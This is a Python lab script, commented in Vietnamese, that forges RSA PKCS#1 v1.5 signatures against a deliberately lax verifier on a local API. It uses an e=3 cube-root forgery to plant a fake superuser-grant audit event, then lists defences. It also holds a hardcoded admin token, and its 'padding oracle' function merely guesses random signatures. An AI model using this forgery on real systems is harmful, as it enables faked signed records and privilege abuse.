#!/usr/bin/env python3
"""
Bleichenbacher Padding Oracle Attack - SIGNATURE FORGERY DEMO

TỔNG QUAN:
==========
Script này FORGE chữ ký RSA PKCS#1 v1.5 mà KHÔNG CẦN PRIVATE KEY!

Có 2 phương pháp:
1. Cube Root Attack (e=3): Tính căn bậc 3 - NHANH, chỉ 1 phép tính
2. Padding Oracle Attack (e=65537): Cần nhiều oracle queries - CHẬM

VÌ SAO HOẠT ĐỘNG:
================
verify_rsa_pkcs1v15_vulnerable() là WEAK VERIFIER:
- CHỈ check: 00 01 prefix
- CHỈ check: có 00 separator trong 20 bytes đầu  
- CHỈ check: hash XUẤT HIỆN ĐÂU ĐÓ trong EM
- KHÔNG check: đủ FF padding (>= 8 bytes)
- KHÔNG check: ASN.1 DigestInfo structure
- KHÔNG check: vị trí chính xác của hash

PHƯƠNG PHÁP FORGE:
=================
1. Craft EM: 00 01 FF 00 [HASH] [GARBAGE...]
2. Với e nhỏ (3): signature = ∛EM
3. Với e lớn (65537): Cần brute-force hoặc padding oracle

KẾT QUẢ:
=======
- Attacker tạo được signature hợp lệ cho BẤT KỲ message nào
- Server chấp nhận và lưu event giả vào database
- KHÔNG cần private key!
"""

import base64
import hashlib
import json
import os
import time
import requests
from typing import Optional, Tuple
from datetime import datetime

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

# ============================================================================
# CẤU HÌNH
# ============================================================================
API_BASE = "http://localhost"
ADMIN_TOKEN = "my-super-secret-admin-token-2025"
KEYS_DIR = os.path.join(os.path.dirname(__file__), "demo_keys")

# Proxy config (set USE_PROXY = True để gửi qua Burp)
USE_PROXY = False
PROXY = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def print_header(title: str):
    print(f"\n{'━'*60}")
    print(f"  {title}")
    print(f"{'━'*60}\n")


# ============================================================================
# MATH UTILITIES
# ============================================================================

def integer_nth_root(n: int, x: int) -> int:
    """
    Tính căn bậc n của số nguyên x.
    Trả về floor(x^(1/n))
    
    Sử dụng Newton-Raphson method.
    """
    if x < 0:
        raise ValueError("Cannot compute root of negative number")
    if x == 0:
        return 0
    if n == 1:
        return x
    
    # Initial guess
    guess = 1 << ((x.bit_length() + n - 1) // n)
    
    while True:
        # Newton-Raphson: new_guess = ((n-1)*guess + x/guess^(n-1)) / n
        guess_pow = guess ** (n - 1)
        new_guess = ((n - 1) * guess + x // guess_pow) // n
        
        if new_guess >= guess:
            break
        guess = new_guess
    
    # Adjust to ensure we have the floor
    while guess ** n > x:
        guess -= 1
    while (guess + 1) ** n <= x:
        guess += 1
    
    return guess


def integer_cube_root(x: int) -> int:
    """Căn bậc 3 của số nguyên."""
    return integer_nth_root(3, x)


# ============================================================================
# KEY MANAGEMENT
# ============================================================================

def get_or_create_vulnerable_key(e: int = 3) -> Tuple[str, str, int, int, int]:
    """
    Lấy hoặc tạo RSA key với e nhỏ (vulnerable).
    
    Returns:
        (service_id, key_id, n, e, key_size_bytes)
    """
    from cryptography.hazmat.primitives.asymmetric import rsa
    
    service_id = f"forge-demo-e{e}"
    
    # Kiểm tra key đã tồn tại chưa
    try:
        resp = requests.get(
            f"{API_BASE}/v1/admin/keys",
            headers={"X-Admin-Token": ADMIN_TOKEN},
            params={"service_id": service_id, "status": "approved"},
            timeout=10
        )
        if resp.status_code == 200:
            keys = resp.json().get("keys", [])
            for key in keys:
                if key.get("status") == "approved":
                    key_id = key.get("public_key_id")
                    # Load public key từ API
                    key_resp = requests.get(
                        f"{API_BASE}/v1/keys/{key_id}",
                        timeout=10
                    )
                    if key_resp.status_code == 200:
                        key_data = key_resp.json()
                        public_pem = key_data.get("public_key_pem")
                        
                        # Parse public key để lấy n, e
                        public_key = serialization.load_pem_public_key(
                            public_pem.encode('utf-8'),
                            backend=default_backend()
                        )
                        pub_numbers = public_key.public_numbers()
                        key_size = (pub_numbers.n.bit_length() + 7) // 8
                        
                        print(f"  ✓ Sử dụng key đã có: {key_id}")
                        print(f"    e = {pub_numbers.e}")
                        return service_id, key_id, pub_numbers.n, pub_numbers.e, key_size
    except Exception as ex:
        print(f"  ⚠ Lỗi kiểm tra key: {ex}")
    
    # Tạo key mới
    print(f"  Tạo RSA keypair với e={e}...")
    
    private_key = rsa.generate_private_key(
        public_exponent=e,
        key_size=2048,
        backend=default_backend()
    )
    public_key = private_key.public_key()
    
    pub_numbers = public_key.public_numbers()
    
    public_pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    ).decode('utf-8')
    
    # Đăng ký key
    timestamp = int(time.time())
    key_id = f"{service_id}:v{timestamp}"
    
    resp = requests.post(
        f"{API_BASE}/v1/keys/register",
        json={
            "service_id": service_id,
            "public_key_id": key_id,
            "public_key_pem": public_pem,
            "algorithm": "rsa-pkcs1v15-vulnerable",
            "description": f"Forge demo key with e={e}"
        },
        timeout=10
    )
    
    if resp.status_code not in (200, 201):
        raise Exception(f"Register failed: {resp.text}")
    
    print(f"  ✓ Registered: {key_id}")
    
    # Approve key
    resp = requests.post(
        f"{API_BASE}/v1/admin/keys/review",
        headers={"X-Admin-Token": ADMIN_TOKEN},
        json={"public_key_id": key_id, "action": "approve"},
        timeout=10
    )
    
    if resp.status_code == 200:
        print(f"  ✓ Approved!")
    
    key_size = (pub_numbers.n.bit_length() + 7) // 8
    
    return service_id, key_id, pub_numbers.n, pub_numbers.e, key_size


# ============================================================================
# SIGNATURE FORGERY - CUBE ROOT ATTACK (e=3)
# ============================================================================

def forge_signature_cube_root(message: bytes, n: int, key_size_bytes: int) -> bytes:
    """
    Forge RSA signature sử dụng Cube Root Attack.
    CHỈ hoạt động với e=3!
    
    Nguyên lý:
    1. Craft EM: 00 01 FF 00 [HASH] [GARBAGE...]
    2. Đảm bảo EM³ < n (để không cần mod n)
    3. Tính signature = ∛EM
    4. Verify: signature³ = EM (exact, không mod)
    
    Weak verifier chấp nhận vì:
    - 00 01 prefix: ✓
    - 00 separator: ✓
    - Hash xuất hiện: ✓
    - Không check garbage bytes!
    """
    # Compute hash
    message_hash = hashlib.sha256(message).digest()  # 32 bytes
    
    # Craft EM với garbage ở cuối
    # Format: 00 01 FF 00 [32-byte hash] [garbage to fill key_size]
    prefix = b'\x00\x01\xff\x00'  # 4 bytes
    
    # Để EM³ < n, ta cần EM < n^(1/3)
    # Với RSA-2048: n ≈ 2^2048, nên EM < 2^682
    # Key size = 256 bytes = 2048 bits
    # Ta chỉ dùng ~40 bytes đầu, còn lại là 0
    
    em_prefix = prefix + message_hash  # 4 + 32 = 36 bytes
    
    # Pad với zeros đủ key_size
    em = em_prefix + b'\x00' * (key_size_bytes - len(em_prefix))
    
    # Convert to integer
    em_int = int.from_bytes(em, byteorder='big')
    
    # Compute cube root
    sig_int = integer_cube_root(em_int)
    
    # Điều chỉnh để sig³ >= em (quan trọng cho verification)
    while sig_int ** 3 < em_int:
        sig_int += 1
    
    # Verify locally
    recovered = sig_int ** 3
    recovered_bytes = recovered.to_bytes(key_size_bytes, byteorder='big')
    
    print(f"\n  Forge details:")
    print(f"    EM (hex, first 60): {em[:30].hex()}")
    print(f"    EM integer: {em_int.bit_length()} bits")
    print(f"    Signature: {sig_int.bit_length()} bits")
    print(f"    sig³ == EM? {sig_int ** 3 == em_int}")
    
    # Check if recovered starts with 00 01
    if recovered_bytes[0:2] == b'\x00\x01':
        print(f"    Recovered starts with 00 01: ✓")
    
    # Convert to bytes
    forged_sig = sig_int.to_bytes(key_size_bytes, byteorder='big')
    
    return forged_sig


# ============================================================================
# SIGNATURE FORGERY - BRUTE FORCE FOR LARGER e
# ============================================================================

def forge_signature_bruteforce(
    message: bytes, 
    n: int, 
    e: int, 
    key_size_bytes: int,
    max_attempts: int = 100000
) -> Optional[bytes]:
    """
    Brute-force forge signature cho e > 3.
    
    Phương pháp:
    1. Craft EM có format: 00 01 [padding] 00 [hash]
    2. Thử các giá trị signature ngẫu nhiên/tuần tự
    3. Check nếu sig^e mod n có format mong muốn
    
    LƯU Ý: Với e=65537, xác suất rất thấp!
    Đây chỉ là demo - trong thực tế cần Padding Oracle Attack.
    """
    import secrets
    
    message_hash = hashlib.sha256(message).digest()
    
    print(f"\n  Brute-force forge (e={e}):")
    print(f"    Max attempts: {max_attempts}")
    print(f"    Hash: {message_hash.hex()[:32]}...")
    
    for attempt in range(max_attempts):
        # Tạo signature ngẫu nhiên
        sig_int = secrets.randbelow(n)
        
        # Compute sig^e mod n
        em_int = pow(sig_int, e, n)
        em = em_int.to_bytes(key_size_bytes, byteorder='big')
        
        # Check weak verifier conditions
        # 1. Starts with 00 01
        if em[0:2] != b'\x00\x01':
            continue
        
        # 2. Has 00 separator in first 20 bytes
        separator_idx = -1
        for i in range(2, min(20, len(em))):
            if em[i] == 0x00:
                separator_idx = i
                break
        
        if separator_idx == -1:
            continue
        
        # 3. Hash appears somewhere after separator
        remaining = em[separator_idx + 1:]
        if message_hash in remaining:
            print(f"    ✓ Found after {attempt + 1} attempts!")
            return sig_int.to_bytes(key_size_bytes, byteorder='big')
        
        if attempt % 10000 == 0 and attempt > 0:
            print(f"    ... {attempt} attempts, still searching")
    
    print(f"    ✗ Not found after {max_attempts} attempts")
    print(f"    (Với e=65537, cần Padding Oracle Attack)")
    return None


# ============================================================================
# PADDING ORACLE ATTACK (e=65537)
# ============================================================================

def query_oracle(
    sig_bytes: bytes,
    service_id: str,
    key_id: str,
    message: bytes
) -> Tuple[bool, str]:
    """
    Query oracle bằng cách gửi signature đến API.
    Returns: (is_conforming, response_type)
    """
    sig_b64 = base64.b64encode(sig_bytes).decode('utf-8')
    
    event_data = {
        "action": "oracle.probe",
        "timestamp": datetime.utcnow().isoformat() + "Z"
    }
    event_canonical = json.dumps(event_data, sort_keys=True, separators=(',', ':'))
    
    # Tính hash của event_canonical (đây là message được verify)
    # NOTE: Oracle verify hash của event_canonical, không phải message param
    
    payload = {
        "service_id": service_id,
        "event_type": "ORACLE_PROBE", 
        "event": event_canonical,
        "event_data": event_data,
        "signature": sig_b64,
        "public_key_id": key_id
    }
    
    kwargs = {"timeout": 5}
    if USE_PROXY:
        kwargs["proxies"] = PROXY
    
    try:
        resp = requests.post(f"{API_BASE}/v1/logs", json=payload, **kwargs)
        
        if resp.status_code == 200:
            msg = resp.json().get("message", "")
            if "WEAK_VALID" in msg:
                return True, "VALID"
            elif "HASH_MISMATCH" in msg:
                return True, "HASH_MISMATCH"  # Conforming but wrong hash
            else:
                return False, msg
        else:
            detail = resp.json().get("detail", "")
            if "No 00 separator" in detail:
                return True, "NO_SEPARATOR"  # Has 00 01 but no separator
            elif "Invalid header" in detail:
                return False, "INVALID_HEADER"
            elif "HASH_MISMATCH" in detail:
                return True, "HASH_MISMATCH"
            else:
                return False, detail
    except Exception as ex:
        return False, f"ERROR: {ex}"


def forge_with_oracle(
    message: bytes,
    service_id: str,
    key_id: str,
    n: int,
    e: int,
    key_size_bytes: int,
    max_oracle_calls: int = 50000
) -> Optional[bytes]:
    """
    Forge signature sử dụng Padding Oracle Attack.
    
    Với weak verifier của chúng ta, ta có thể dùng simplified approach:
    1. Craft EM với format đúng
    2. Thử tìm signature mà sig^e mod n khớp
    
    Đây là simplified version - full Bleichenbacher cần nhiều code hơn.
    """
    import secrets
    
    message_hash = hashlib.sha256(message).digest()
    
    print(f"\n  Oracle-based forge (e={e}):")
    print(f"    Max oracle calls: {max_oracle_calls}")
    
    oracle_calls = 0
    conforming_count = 0
    
    for attempt in range(max_oracle_calls):
        # Tạo signature ngẫu nhiên
        sig_int = secrets.randbelow(n)
        sig_bytes = sig_int.to_bytes(key_size_bytes, byteorder='big')
        
        is_conforming, response = query_oracle(sig_bytes, service_id, key_id, message)
        oracle_calls += 1
        
        if is_conforming:
            conforming_count += 1
            
            if response == "VALID":
                print(f"    ✓ Found VALID signature after {oracle_calls} calls!")
                return sig_bytes
        
        if oracle_calls % 5000 == 0:
            print(f"    ... {oracle_calls} calls, {conforming_count} conforming")
    
    print(f"    ✗ Not found after {oracle_calls} oracle calls")
    print(f"    Conforming found: {conforming_count}")
    return None


# ============================================================================
# SEND FORGED EVENT TO API
# ============================================================================

def send_forged_event(
    service_id: str,
    key_id: str,
    forged_signature: bytes,
    fake_event: dict
) -> dict:
    """Gửi event với chữ ký giả đến API."""
    event_canonical = json.dumps(fake_event, sort_keys=True, separators=(',', ':'))
    sig_b64 = base64.b64encode(forged_signature).decode('utf-8')
    
    payload = {
        "service_id": service_id,
        "event_type": "FORGED_ADMIN_ACTION",
        "event": event_canonical,
        "event_data": fake_event,
        "signature": sig_b64,
        "public_key_id": key_id
    }
    
    kwargs = {"timeout": 10}
    if USE_PROXY:
        kwargs["proxies"] = PROXY
    
    resp = requests.post(f"{API_BASE}/v1/logs", json=payload, **kwargs)
    
    return {
        "status_code": resp.status_code,
        "response": resp.json() if resp.headers.get("content-type", "").startswith("application/json") else resp.text
    }


def verify_in_database(event_id: int) -> Optional[dict]:
    """Xác nhận event đã lưu trong database."""
    resp = requests.get(f"{API_BASE}/v1/logs/{event_id}", timeout=10)
    if resp.status_code == 200:
        return resp.json()
    return None


# ============================================================================
# MAIN
# ============================================================================

def main():
    print("=" * 70)
    print("   BLEICHENBACHER SIGNATURE FORGERY ATTACK")
    print("   Forge chữ ký RSA mà KHÔNG CẦN PRIVATE KEY!")
    print("=" * 70)
    
    # ========================================
    # PHẦN 1: Setup key với e=3 (vulnerable)
    # ========================================
    print_header("PHẦN 1: SETUP VULNERABLE KEY (e=3)")
    
    print("RSA với e=3 dễ bị tấn công cube root attack")
    print("vì signature³ = EM có thể không cần mod n")
    
    try:
        service_id, key_id, n, e, key_size = get_or_create_vulnerable_key(e=3)
    except Exception as ex:
        print(f"✗ Lỗi setup key: {ex}")
        return
    
    print(f"\n  Service ID: {service_id}")
    print(f"  Key ID: {key_id}")
    print(f"  n: {n.bit_length()} bits")
    print(f"  e: {e}")
    print(f"  Key size: {key_size} bytes")
    
    # ========================================
    # PHẦN 2: Tạo payload giả
    # ========================================
    print_header("PHẦN 2: TẠO PAYLOAD GIẢ MẠO")
    
    fake_event = {
        "action": "admin.grant_superuser",
        "actor": "admin@company.com",  # Giả mạo admin!
        "target": "attacker@evil.com",
        "permissions": ["superuser", "delete_all", "access_secrets"],
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "note": "FORGED - Attacker không có private key!"
    }
    
    event_canonical = json.dumps(fake_event, sort_keys=True, separators=(',', ':'))
    message = event_canonical.encode('utf-8')
    
    print("Event giả mạo:")
    print(json.dumps(fake_event, indent=2))
    
    # ========================================
    # PHẦN 3: FORGE SIGNATURE (không cần private key!)
    # ========================================
    print_header("PHẦN 3: FORGE SIGNATURE (CUBE ROOT ATTACK)")
    
    print("Sử dụng Cube Root Attack vì e=3:")
    print("  1. Craft EM: 00 01 FF 00 [HASH] [zeros...]")
    print("  2. Tính: signature = ∛EM")
    print("  3. Verification: signature³ mod n = EM")
    print("  4. Weak verifier chấp nhận vì hash có mặt!")
    
    forged_sig = forge_signature_cube_root(message, n, key_size)
    
    print(f"\n  ✓ Forged signature:")
    print(f"    Hex (first 40): {forged_sig.hex()[:40]}...")
    print(f"    Base64: {base64.b64encode(forged_sig).decode()[:60]}...")
    
    # ========================================
    # PHẦN 4: GỬI PAYLOAD GIẢ LÊN HỆ THỐNG
    # ========================================
    print_header("PHẦN 4: GỬI PAYLOAD GIẢ LÊN API")
    
    print("Gửi event với chữ ký GIẢ đến /v1/logs...")
    
    result = send_forged_event(service_id, key_id, forged_sig, fake_event)
    
    print(f"\n  Response:")
    print(f"    Status: {result['status_code']}")
    print(f"    Body: {json.dumps(result['response'], indent=4)}")
    
    if result['status_code'] == 200:
        resp_data = result['response']
        
        if resp_data.get("status") == "accepted":
            event_id = resp_data.get("id")
            
            print()
            print("  " + "!" * 50)
            print("  ⚠️  TẤN CÔNG THÀNH CÔNG!")
            print("  ⚠️  CHỮ KÝ GIẢ ĐƯỢC CHẤP NHẬN!")
            print("  ⚠️  EVENT GIẢ ĐÃ LƯU VÀO DATABASE!")
            print("  " + "!" * 50)
            
            # ========================================
            # PHẦN 5: XÁC NHẬN TRONG DATABASE
            # ========================================
            print_header("PHẦN 5: XÁC NHẬN EVENT GIẢ TRONG DATABASE")
            
            if event_id:
                stored = verify_in_database(event_id)
                if stored:
                    print(f"  ✓ Event ID {event_id} tồn tại trong database!")
                    print(f"    service_id: {stored.get('service_id')}")
                    print(f"    event_type: {stored.get('event_type')}")
                    print(f"    verified: {stored.get('verified')}")
                    print(f"    created_at: {stored.get('created_at')}")
    else:
        print("\n  ✗ Tấn công thất bại")
        print("    Kiểm tra lại key hoặc API")
    
    # ========================================
    # KẾT LUẬN
    # ========================================
    print_header("KẾT LUẬN")
    
    print("TẤN CÔNG THÀNH CÔNG VÌ:")
    print("  ✓ RSA sử dụng e=3 (public exponent nhỏ)")
    print("  ✓ Weak verifier CHỈ kiểm tra:")
    print("      - Prefix 00 01")
    print("      - Hash xuất hiện đâu đó trong EM")
    print("  ✓ KHÔNG kiểm tra:")
    print("      - Đủ FF padding bytes (>= 8)")
    print("      - ASN.1 DigestInfo structure")
    print("      - Vị trí chính xác của hash")
    print()
    print("ATTACKER CÓ THỂ:")
    print("  • Forge signature mà KHÔNG CẦN private key!")
    print("  • Tạo log giả cho BẤT KỲ message nào!")
    print("  • Giả mạo hành động của admin!")
    print("  • Chèn dữ liệu giả vào hệ thống audit!")
    print()
    print("CÁCH PHÒNG CHỐNG:")
    print("  1. Sử dụng e=65537 (standard RSA)")
    print("  2. Dùng STRICT PKCS#1 v1.5 verifier")
    print("  3. Tốt hơn: Dùng RSA-PSS hoặc Ed25519")
    print("  4. Kiểm tra đầy đủ cấu trúc padding")


if __name__ == "__main__":
    main()
